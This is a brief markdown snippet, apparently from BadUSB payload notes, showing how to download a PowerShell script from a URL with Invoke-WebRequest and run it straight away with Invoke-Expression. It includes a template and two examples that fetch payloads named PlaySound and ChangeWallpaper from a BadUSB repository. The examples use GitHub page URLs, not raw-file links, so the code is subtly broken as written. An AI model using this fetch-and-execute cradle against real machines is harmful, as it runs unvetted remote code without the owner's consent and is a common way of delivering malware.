### Download and direclty run a powershell script

    $ScriptFromGithHub = Invoke-WebRequest https://raw.githubusercontent.com/username/script.ps1
    Invoke-Expression $($ScriptFromGithHub.Content)

Example - Play Sound

    $ScriptFromGithHub = Invoke-WebRequest https://github.com/offport/BadUSB/blob/main/Windows/Payloads/PlaySound.ps1
    Invoke-Expression $($ScriptFromGithHub.Content)
    
Example - Change Wallpaper

    $ScriptFromGithHub = Invoke-WebRequest https://github.com/offport/BadUSB/blob/main/Windows/Payloads/ChangeWallpaper.ps1
    Invoke-Expression $($ScriptFromGithHub.Content)
